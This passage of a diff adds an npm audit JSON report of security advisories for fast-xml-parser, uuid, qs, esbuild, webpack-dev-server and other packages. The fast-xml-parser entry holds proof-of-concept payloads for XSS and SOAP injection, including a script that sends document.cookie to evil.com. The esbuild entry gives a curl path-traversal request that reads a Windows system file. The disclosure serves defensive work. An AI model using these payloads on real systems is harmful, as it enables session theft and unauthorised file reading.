+      "overview": "# fast-xml-parser XMLBuilder: Comment and CDATA Injection via Unescaped Delimiters\n\n## Summary\n\nfast-xml-parser XMLBuilder does not escape the `-->` sequence in comment content or the `]]>` sequence in CDATA sections when building XML from JavaScript objects. This allows XML injection when user-controlled data flows into comments or CDATA elements, leading to XSS, SOAP injection, or data manipulation.\n\nExisting CVEs for fast-xml-parser cover different issues:\n- CVE-2023-26920: Prototype pollution (parser)\n- CVE-2023-34104: ReDoS (parser)\n- CVE-2026-27942: Stack overflow in XMLBuilder with preserveOrder\n- CVE-2026-25896: Entity encoding bypass via regex in DOCTYPE entities\n\nThis finding covers **unescaped comment/CDATA delimiters in XMLBuilder** - a distinct vulnerability.\n\n## Vulnerable Code\n\n**File**: `src/fxb.js`\n\n```javascript\n// Line 442 - Comment building with NO escaping of -->\nbuildTextValNode(val, key, attrStr, level) {\n    // ...\n    if (key === this.options.commentPropName) {\n        return this.indentate(level) + `<!--${val}-->` + this.newLine;  // VULNERABLE\n    }\n    // ...\n    if (key === this.options.cdataPropName) {\n        return this.indentate(level) + `<![CDATA[${val}]]>` + this.newLine;  // VULNERABLE\n    }\n}\n```\n\nCompare with attribute/text escaping which IS properly handled via `replaceEntitiesValue()`.\n\n## Proof of Concept\n\n### Test 1: Comment Injection (XSS in SVG/HTML context)\n\n```javascript\nimport { XMLBuilder } from 'fast-xml-parser';\n\nconst builder = new XMLBuilder({\n  commentPropName: \"#comment\",\n  format: true,\n  suppressEmptyNode: true\n});\n\nconst xml = {\n  root: {\n    \"#comment\": \"--><script>alert('XSS')</script><!--\",\n    data: \"legitimate content\"\n  }\n};\n\nconsole.log(builder.build(xml));\n```\n\n**Output**:\n```xml\n<root>\n  <!----><script>alert('XSS')</script><!---->\n  <data>legitimate content</data>\n</root>\n```\n\n### Test 2: CDATA Injection (RSS feed)\n\n```javascript\nconst builder = new XMLBuilder({\n  cdataPropName: \"#cdata\",\n  format: true,\n  suppressEmptyNode: true\n});\n\nconst rss = {\n  rss: { channel: { item: {\n    title: \"Article\",\n    description: {\n      \"#cdata\": \"Content]]><script>fetch('https://evil.com/'+document.cookie)</script><![CDATA[more\"\n    }\n  }}}\n};\n\nconsole.log(builder.build(rss));\n```\n\n**Output**:\n```xml\n<rss>\n  <channel>\n    <item>\n      <title>Article</title>\n      <description>\n        <![CDATA[Content]]><script>fetch('https://evil.com/'+document.cookie)</script><![CDATA[more]]>\n      </description>\n    </item>\n  </channel>\n</rss>\n```\n\n### Test 3: SOAP Message Injection\n\n```javascript\nconst builder = new XMLBuilder({\n  commentPropName: \"#comment\",\n  format: true\n});\n\nconst soap = {\n  \"soap:Envelope\": {\n    \"soap:Body\": {\n      \"#comment\": \"Request from user: --><soap:Body><Action>deleteAll</Action></soap:Body><!--\",\n      Action: \"getBalance\",\n      UserId: \"12345\"\n    }\n  }\n};\n\nconsole.log(builder.build(soap));\n```\n\n**Output**:\n```xml\n<soap:Envelope>\n  <soap:Body>\n    <!--Request from user: --><soap:Body><Action>deleteAll</Action></soap:Body><!---->\n    <Action>getBalance</Action>\n    <UserId>12345</UserId>\n  </soap:Body>\n</soap:Envelope>\n```\n\nThe injected `<Action>deleteAll</Action>` appears as a real SOAP action element.\n\n## Tested Output\n\nAll tests run on Node.js v22, fast-xml-parser v5.5.12:\n\n```\n1. COMMENT INJECTION:\n   Injection successful: true\n\n2. CDATA INJECTION (RSS feed scenario):\n   Injection successful: true\n\n4. Round-trip test:\n   Injection present: true\n\n5. SOAP MESSAGE INJECTION:\n   Contains injected Action: true\n```\n\n## Impact\n\nAn attacker who controls data that flows into XML comments or CDATA sections via XMLBuilder can:\n\n1. **XSS**: Inject `<script>` tags into XML/SVG/HTML documents served to browsers\n2. **SOAP injection**: Modify SOAP message structure by injecting XML elements\n3. **RSS/Atom feed poisoning**: Inject scripts into RSS feed items via CDATA breakout\n4. **XML document manipulation**: Break XML structure by escaping comment/CDATA context\n\nThis is practically exploitable whenever applications use XMLBuilder to generate XML from data that includes user-controlled content in comments or CDATA (e.g., RSS feeds, SOAP services, SVG generation, config files).\n\n## Suggested Fix\n\nEscape delimiters in comment and CDATA content:\n\n```javascript\n// For comments: replace -- with escaped equivalent\nif (key === this.options.commentPropName) {\n    const safeVal = String(val).replace(/--/g, '&#45;&#45;');\n    return this.indentate(level) + `<!--${safeVal}-->` + this.newLine;\n}\n\n// For CDATA: split on ]]> and rejoin with separate CDATA sections\nif (key === this.options.cdataPropName) {\n    const safeVal = String(val).replace(/]]>/g, ']]]]><![CDATA[>');\n    return this.indentate(level) + `<![CDATA[${safeVal}]]>` + this.newLine;\n}\n```",
+      "reported_by": null,
+      "title": "fast-xml-parser XMLBuilder: XML Comment and CDATA Injection via Unescaped Delimiters",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41650"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-xml-parser",
+      "vulnerable_versions": "<5.7.0",
+      "github_advisory_id": "GHSA-gh4j-gqv2-49f6",
+      "recommendation": "Upgrade to version 5.7.0 or later",
+      "patched_versions": ">=5.7.0",
+      "updated": "2026-05-08T21:47:28.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-91"
+      ],
+      "url": "https://github.com/advisories/GHSA-gh4j-gqv2-49f6"
+    },
+    "1119438": {
+      "findings": [
+        {
+          "version": "2.0.0",
+          "paths": [
+            "apps__gallery>jest-environment-jsdom>jsdom>http-proxy-agent>@tootallnate/once"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-3449\n- https://github.com/TooTallNate/once/issues/8\n- https://github.com/TooTallNate/once/commit/b9f43cc5259bee2952d91ad3cdbd201a82df448a\n- https://security.snyk.io/vuln/SNYK-JS-TOOTALLNATEONCE-15250612\n- https://github.com/TooTallNate/once/releases/tag/v2.0.1\n- https://github.com/advisories/GHSA-vpq2-c234-7xj6",
+      "created": "2026-03-03T06:31:14.000Z",
+      "id": 1119438,
+      "npm_advisory_id": null,
+      "overview": "Versions of the package @tootallnate/once before 3.0.1 are vulnerable to Incorrect Control Flow Scoping in promise resolving when AbortSignal option is used. The Promise remains in a permanently pending state after the signal is aborted, causing any await or .then() usage to hang indefinitely. This can cause a control-flow leak that can lead to stalled requests, blocked workers, or degraded application availability.",
+      "reported_by": null,
+      "title": "@tootallnate/once vulnerable to Incorrect Control Flow Scoping",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-3449"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "@tootallnate/once",
+      "vulnerable_versions": "<2.0.1",
+      "github_advisory_id": "GHSA-vpq2-c234-7xj6",
+      "recommendation": "Upgrade to version 2.0.1 or later",
+      "patched_versions": ">=2.0.1",
+      "updated": "2026-05-21T16:55:50.000Z",
+      "cvss": {
+        "score": 3.3,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-705"
+      ],
+      "url": "https://github.com/advisories/GHSA-vpq2-c234-7xj6"
+    },
+    "1119440": {
+      "findings": [
+        {
+          "version": "7.0.3",
+          "paths": [
+            "apps__docs>@docusaurus/core>@docusaurus/bundler>copy-webpack-plugin>serialize-javascript"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/yahoo/serialize-javascript/security/advisories/GHSA-qj8w-gfj5-8c6v\n- https://github.com/yahoo/serialize-javascript/commit/f147e90269b58bb6e539cfdf3d0e20d6ad14204b\n- https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-34043\n- https://github.com/yahoo/serialize-javascript/releases/tag/v5.0.0\n- https://github.com/advisories/GHSA-qj8w-gfj5-8c6v",
+      "created": "2026-03-27T18:18:54.000Z",
+      "id": 1119440,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n**What kind of vulnerability is it?**\n\nIt is a **Denial of Service (DoS)** vulnerability caused by CPU exhaustion. When serializing a specially crafted \"array-like\" object (an object that inherits from `Array.prototype` but has a very large `length` property), the process enters an intensive loop that consumes 100% CPU and hangs indefinitely.\n\n**Who is impacted?**\n\nApplications that use `serialize-javascript` to serialize untrusted or user-controlled objects are at risk. While direct exploitation is difficult, it becomes a high-priority threat if the application is also vulnerable to **Prototype Pollution** or handles untrusted data via **YAML Deserialization**, as these could be used to inject the malicious object.\n\n### Patches\n\n**Has the problem been patched?**\n\nYes, the issue has been patched by replacing `instanceof Array` checks with `Array.isArray()` and using `Object.keys()` for sparse array detection.\n\n**What versions should users upgrade to?**\n\nUsers should upgrade to **`v7.0.5`** or later.\n\n### Workarounds\n\n**Is there a way for users to fix or remediate the vulnerability without upgrading?**\n\nThere is no direct code-level workaround within the library itself. However, users can mitigate the risk by:\n\n* Validating and sanitizing all input before passing it to the `serialize()` function.\n* Ensuring the environment is protected against Prototype Pollution.\n* Upgrading to **`v7.0.5`** as soon as possible.\n\n### Acknowledgements\n\nSerialize JavaScript thanks **Tomer Aberbach** (@TomerAberbach) for discovering and privately disclosing this issue.",
+      "reported_by": null,
+      "title": "Serialize JavaScript has CPU Exhaustion Denial of Service via crafted array-like objects",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-34043"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "serialize-javascript",
+      "vulnerable_versions": ">=5.0.0 <7.0.5",
+      "github_advisory_id": "GHSA-qj8w-gfj5-8c6v",
+      "recommendation": "Upgrade to version 7.0.5 or later",
+      "patched_versions": ">=7.0.5",
+      "updated": "2026-05-21T18:30:15.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-834"
+      ],
+      "url": "https://github.com/advisories/GHSA-qj8w-gfj5-8c6v"
+    },
+    "1119441": {
+      "findings": [
+        {
+          "version": "7.0.3",
+          "paths": [
+            "apps__cloud-backend>drizzle-orm>expo-sqlite>expo>@expo/config-plugins>xcode>uuid"
+          ]
+        },
+        {
+          "version": "8.3.2",
+          "paths": [
+            "apps__docs>@docusaurus/core>webpack-dev-server>sockjs>uuid"
+          ]
+        },
+        {
+          "version": "3.4.0",
+          "paths": [
+            "apps__master>node-mac-notifier>uuid"
+          ]
+        },
+        {
+          "version": "10.0.0",
+          "paths": [
+            "apps__master>uuid"
+          ]
+        },
+        {
+          "version": "11.1.0",
+          "paths": [
+            "apps__moneytrash>uuid"
+          ]
+        },
+        {
+          "version": "9.0.1",
+          "paths": [
+            "packages__ui>@storybook/addon-essentials>@storybook/addon-actions>uuid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq\n- https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34\n- https://github.com/uuidjs/uuid/releases/tag/v14.0.0\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41907\n- https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e\n- https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d\n- https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a\n- https://github.com/uuidjs/uuid/releases/tag/v11.1.1\n- https://github.com/uuidjs/uuid/releases/tag/v12.0.1\n- https://github.com/uuidjs/uuid/releases/tag/v13.0.1\n- https://github.com/advisories/GHSA-w5hq-g745-h8pq",
+      "created": "2026-04-22T20:53:24.000Z",
+      "id": 1119441,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=>v4({},new Uint8Array(8),4)],\n  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+      "reported_by": null,
+      "title": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41907"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "uuid",
+      "vulnerable_versions": "<11.1.1",
+      "github_advisory_id": "GHSA-w5hq-g745-h8pq",
+      "recommendation": "Upgrade to version 11.1.1 or later",
+      "patched_versions": ">=11.1.1",
+      "updated": "2026-05-21T18:25:57.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-787",
+        "CWE-1285"
+      ],
+      "url": "https://github.com/advisories/GHSA-w5hq-g745-h8pq"
+    },
+    "1119502": {
+      "findings": [
+        {
+          "version": "6.14.2",
+          "paths": [
+            "apps__gallery>formidable>qs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-q8mj-m7cp-5q26\n- https://nvd.nist.gov/vuln/detail/CVE-2026-8723\n- https://github.com/ljharb/qs/commit/21f80b33e5c8b3f7eba1034fff0da4a4a37a1d41\n- https://github.com/advisories/GHSA-q8mj-m7cp-5q26",
+      "created": "2026-05-22T17:27:19.000Z",
+      "id": 1119502,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs.stringify` throws `TypeError` when called with `arrayFormat: 'comma'` and `encodeValuesOnly: true` on an array containing `null` or `undefined`. The throw is synchronous and not handled by any of qs's null-related options (`skipNulls`, `strictNullHandling`).\n\n### Details\n\nIn the comma + `encodeValuesOnly` branch, `lib/stringify.js:145` mapped the array through the raw encoder before joining:\n\n```js\nobj = utils.maybeMap(obj, encoder);\n```\n\n`utils.encode` (`lib/utils.js:195`) reads `str.length` with no null guard, so a `null` or `undefined` element throws `TypeError`. `skipNulls` and `strictNullHandling` are both checked in the per-element loop below this line and never get a chance to run.\n\nSame class of bug as the filter-array path fixed in 0c180a4. The vulnerable shape of the comma + `encodeValuesOnly` branch was introduced in 4c4b23d (\"encode comma values more consistently\", PR #463, 2023-01-19), first released in v6.11.1.\n\n#### PoC\n\n```js\nconst qs = require('qs');\n\nqs.stringify({ a: [null, 'b'] },      { arrayFormat: 'comma', encodeValuesOnly: true });\nqs.stringify({ a: [undefined, 'b'] }, { arrayFormat: 'comma', encodeValuesOnly: true });\nqs.stringify({ a: [null] },           { arrayFormat: 'comma', encodeValuesOnly: true });\n// TypeError: Cannot read properties of null (reading 'length')\n//     at encode (lib/utils.js:195:13)\n//     at Object.maybeMap (lib/utils.js:322:37)\n//     at stringify (lib/stringify.js:145:25)\n```\n\n#### Fix\n\n`lib/stringify.js:145`, applied in 21f80b3 on `main`:\n\n```diff\n- obj = utils.maybeMap(obj, encoder);\n+ obj = utils.maybeMap(obj, function (v) {\n+     return v == null ? v : encoder(v);\n+ });\n```\n\n`null` and `undefined` now pass through `maybeMap` unchanged and reach the `join(',')` step as-is. For `{ a: [null, 'b'] }` this produces `a=,b`, matching the non-`encodeValuesOnly` comma path (which already joins before encoding and produces `a=%2Cb` for the same input). Single-element `[null]` arrays still collapse via the existing `obj.join(',') || null` and remain subject to `skipNulls` / `strictNullHandling` in the main loop.\n\n### Affected versions\n\n`>=6.11.1 <=6.15.1`\n\nThe vulnerable code shape was introduced in 4c4b23d and first shipped in v6.11.1. Earlier versions ΓÇö including all of 6.7.x, 6.8.x, 6.9.x, 6.10.x, and 6.11.0 ΓÇö implemented the comma + `encodeValuesOnly` path differently (joining before encoding) and are not affected. Empirically verified across released versions.\n\n### Impact\n\nApplication code that calls `qs.stringify` with both `arrayFormat: 'comma'` and `encodeValuesOnly: true` (both non-default) on input that may contain a `null` or `undefined` array element will throw synchronously instead of producing a query string. In a typical Node.js HTTP framework (Express, Fastify, Koa, hapi) the sync throw is caught by the framework's error boundary and the affected request returns a 500; the worker process does not exit and subsequent requests are unaffected. The \"kills the worker process\" framing applies only to call sites outside a request-handler error boundary (background jobs, startup paths, stream pipelines) or to deployments with framework error handling explicitly disabled.\n\nThe vulnerable input is a `null` or `undefined` entry inside an array; this is reachable from JSON request bodies or from application code constructing arrays from user input, but not from standard HTML form submissions (which produce strings or omitted fields, not literal `null`).",
+      "reported_by": null,
+      "title": "qs has a remotely triggerable DoS: qs.stringify crashes with TypeError on null/undefined entries in comma-format arrays when encodeValuesOnly is set",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-8723"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=6.11.1 <=6.15.1",
+      "github_advisory_id": "GHSA-q8mj-m7cp-5q26",
+      "recommendation": "Upgrade to version 6.15.2 or later",
+      "patched_versions": ">=6.15.2",
+      "updated": "2026-05-22T17:27:20.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-476"
+      ],
+      "url": "https://github.com/advisories/GHSA-q8mj-m7cp-5q26"
+    },
+    "1120656": {
+      "findings": [
+        {
+          "version": "17.4.2",
+          "paths": [
+            "apps__master>passkit-generator>joi"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/hapijs/joi/security/advisories/GHSA-q7cg-457f-vx79\n- https://github.com/hapijs/joi/pull/3113\n- https://github.com/hapijs/joi/commit/2392713d3e9dd91ba752ac0c96e0eaf3d24b9a11\n- https://github.com/advisories/GHSA-q7cg-457f-vx79",
+      "created": "2026-06-11T13:27:32.000Z",
+      "id": 1120656,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nDenial of service via untrapped exception in services validating user-supplied JSON / object input with recursive link schemas. \n\nThe blast radius depends on how the application invokes joi:\n- Highest impact: `validate()` called without `try/catch` in a request handler would cause an unhandled exception, potentially crashing the process.\n- Lower impact: `validateAsync()` or `validate()` inside a `try/catch`, the validation fails, but the error type is `RangeError` rather than a structured `ValidationError`, complicating error handling.\n\n### Patches\nUpgrade to version >= 18.2.1.\n\n### Workarounds\nTry/catch the validation to avoid uncaught exceptions.\n\n### References\n- Pull request: hapijs/joi#3113",
+      "reported_by": null,
+      "title": "joi has an uncaught RangeError on deeply nested input through recursive `link()` schemas",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-48038"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "joi",
+      "vulnerable_versions": "<17.13.4",
+      "github_advisory_id": "GHSA-q7cg-457f-vx79",
+      "recommendation": "Upgrade to version 17.13.4 or later",
+      "patched_versions": ">=17.13.4",
+      "updated": "2026-06-12T19:28:28.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-q7cg-457f-vx79"
+    },
+    "1120680": {
+      "findings": [
+        {
+          "version": "0.27.7",
+          "paths": [
+            "apps__license-generator>esbuild"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-g7r4-m6w7-qqqr\n- https://github.com/evanw/esbuild/releases/tag/v0.28.1\n- https://github.com/advisories/GHSA-g7r4-m6w7-qqqr",
+      "created": "2026-06-12T20:08:53.000Z",
+      "id": 1120680,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe development server contains a path traversal vulnerability on Windows when serving files from `servedir`.\n\nDue to the use of `path.Clean()` (which only normalizes forward-slash `/` separators) instead of a Windows-aware path normalization function, it is possible to craft requests using backslashes (`\\`) that bypass the intended directory containment logic. An attacker can escape the configured `servedir` root and access arbitrary files on the filesystem.\nThis issue affects Windows environments only.\n\n### Details\n\nThe request path is sanitized using:\n```go\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165\nqueryPath := path.Clean(req.URL.Path)[1:]\n```\n\n\nHowever:\n- `path.Clean()` is POSIX-style and only understands `/` (docs: `https://pkg.go.dev/path#Clean`)\n- On Windows, `\\` is a valid path separator\n- `path.Clean()` does not treat `\\` as a separator\n\nLater, the server constructs the absolute path:\n```go\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L221\nabsPath := h.fs.Join(h.servedir, queryPath)\n```\n\nIf `queryPath` contains sequences such as:\n```\n..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini\n```\n\n`path.Clean()` will not normalize them, but the Windows filesystem will interpret `\\` as directory separators when resolving `absPath`.\nBecause the implementation does not verify that the final resolved path remains within `servedir`, it allows directory traversal outside the intended root directory.\n### Vulnerable Code\n\n```go\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165\n\tqueryPath := path.Clean(req.URL.Path)[1:]\n\t....\n\t// Check for a file in the \"servedir\" directory\n\tif h.servedir != \"\" && kind != fs.FileEntry {\n\t\tabsPath := h.fs.Join(h.servedir, queryPath)\n\t\tif absDir := h.fs.Dir(absPath); absDir != absPath {\n\t\t\tif entries, err, _ := h.fs.ReadDirectory(absDir); err == nil {\n\t\t\t\tif entry, _ := entries.Get(h.fs.Base(absPath)); entry != nil && entry.Kind(h.fs) == fs.FileEntry {\n\t....\t\t\t\t\n```\n\n\n### Steps to reproduce\n\n```\nnpm install --save-exact --save-dev esbuild\n\necho \"console.log(1)\" > app.js\n\n.\\node_modules\\.bin\\esbuild --version\n0.27.3\n\n.\\node_modules\\.bin\\esbuild app.js --bundle --outdir=www --servedir=www --watch\n\ncurl -i --path-as-is \"http://localhost:8000/..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini\"\n<content of Windows\\system.ini>\n```\n\n\n### Impact\n\n- Arbitrary file read on Windows\n- Exposure of sensitive files",
+      "reported_by": null,
+      "title": "esbuild allows arbitrary file read when running the development server on Windows",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "esbuild",
+      "vulnerable_versions": ">=0.27.3 <0.28.1",
+      "github_advisory_id": "GHSA-g7r4-m6w7-qqqr",
+      "recommendation": "Upgrade to version 0.28.1 or later",
+      "patched_versions": ">=0.28.1",
+      "updated": "2026-06-12T20:08:54.000Z",
+      "cvss": {
+        "score": 2.5,
+        "vectorString": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-g7r4-m6w7-qqqr"
+    },
+    "1123528": {
+      "findings": [
+        {
+          "version": "7.29.0",
+          "paths": [
+            "apps__cloud-backend>drizzle-orm>expo-sqlite>expo>@expo/cli>@expo/require-utils>@babel/core"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/babel/babel/security/advisories/GHSA-4x5r-pxfx-6jf8\n- https://babeljs.io/docs/options#inputsourcemap\n- https://nvd.nist.gov/vuln/detail/CVE-2026-49356\n- https://github.com/advisories/GHSA-4x5r-pxfx-6jf8",
+      "created": "2026-06-15T17:14:14.000Z",
+      "id": 1123528,
+      "npm_advisory_id": null,
+      "overview": "## Impact\n\nUsing `@babel/core` to compile maliciously crafted code can allow ab attacker to read any source map from the system that is running Babel, if these conditions are _all_ true:\n- the attacker controls the input source code\n- the attacker can read the output source code\n- the attacker knows the path of the source map file that they want to read\n\n**Users that only compile trusted code are not impacted.**\n\n## Patches\n\nThe vulnerability has been fixed in `@babel/core@7.29.6` and `@babel/core@8.0.0-rc.6`.\n\n## Workarounds\n\nCallers can mitigate the issue without upgrading by setting [`inputSourceMap: false`](https://babeljs.io/docs/options#inputsourcemap) in their Babel options.\n\nCallers can also manually extract the `#sourceMappingURL` comment from the input source code, validate whether the source map that it links to is allowed to be read, and if it is pass an object to `inputSourceMap` (passing `false` when it's not).\n\n## Credits\n\nThanks Teodor-Cristian Radoi for reporting the vulnerability.",
+      "reported_by": null,
+      "title": "@babel/core: Arbitrary File Read via sourceMappingURL Comment",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-49356"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "@babel/core",
+      "vulnerable_versions": "<=7.29.0",
+      "github_advisory_id": "GHSA-4x5r-pxfx-6jf8",
+      "recommendation": "Upgrade to version 7.29.6 or later",
+      "patched_versions": ">=7.29.6",
+      "updated": "2026-07-15T22:05:27.000Z",
+      "cvss": {
+        "score": 3.2,
+        "vectorString": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-4x5r-pxfx-6jf8"
+    },
+    "1123965": {
+      "findings": [
+        {
+          "version": "5.2.5",
+          "paths": [
+            "apps__docs>@docusaurus/core>webpack-dev-server"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-f5vj-f2hx-8m93\n- https://nvd.nist.gov/vuln/detail/CVE-2026-14620\n- https://github.com/webpack/webpack-dev-server/pull/5698\n- https://github.com/webpack/webpack-dev-server/commit/80cd9eea54975fe632a518d8bd902a260f374e7c\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/webpack/webpack-dev-server/releases/tag/v5.2.6\n- https://github.com/advisories/GHSA-f5vj-f2hx-8m93",
+      "created": "2026-07-20T22:01:56.000Z",
+      "id": 1123965,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe internal `/webpack-dev-server/open-editor` and `/webpack-dev-server/invalidate` endpoints perform state-changing actions on any `GET` request, without verifying that the request originated from the dev server's own page. Any website a developer visits while the dev server is running can trigger them cross-origin with no interaction beyond the visit.\n\nAn attacker can open an arbitrary existing local file in the developer's editor, including files outside the project root (e.g. `~/.ssh/config`). The file's contents are not returned to the attacker. Repeated requests can also spawn editor processes and force recompilations, degrading the developer's machine.\n\n### Patches\n\nFixed in `webpack-dev-server` 5.2.6 by rejecting cross-site requests to the `/webpack-dev-server/open-editor` and `/webpack-dev-server/invalidate` endpoints (see [PR #5698](https://github.com/webpack/webpack-dev-server/pull/5698)).\n\n### Workarounds\n\nNone",
+      "reported_by": null,
+      "title": "webpack-dev-server vulnerable to cross-site request forgery via internal developer endpoints",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-14620"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "webpack-dev-server",
+      "vulnerable_versions": "<=5.2.5",
+      "github_advisory_id": "GHSA-f5vj-f2hx-8m93",
+      "recommendation": "Upgrade to version 5.2.6 or later",
+      "patched_versions": ">=5.2.6",
+      "updated": "2026-07-20T22:02:59.000Z",
+      "cvss": {
+        "score": 4.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-352",
+        "CWE-749"
+      ],
+      "url": "https://github.com/advisories/GHSA-f5vj-f2hx-8m93"
+    },
+    "1123966": {
+      "findings": [
+        {
+          "version": "5.2.5",
+          "paths": [
+            "apps__docs>@docusaurus/core>webpack-dev-server"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-m28w-2pqf-7qgj\n- https://nvd.nist.gov/vuln/detail/CVE-2026-14631\n- https://github.com/webpack/webpack-dev-server/pull/5699\n- https://github.com/webpack/webpack-dev-server/commit/f21ed0f44aceb6132abb591ee8b60d770b6e489f\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-m28w-2pqf-7qgj",
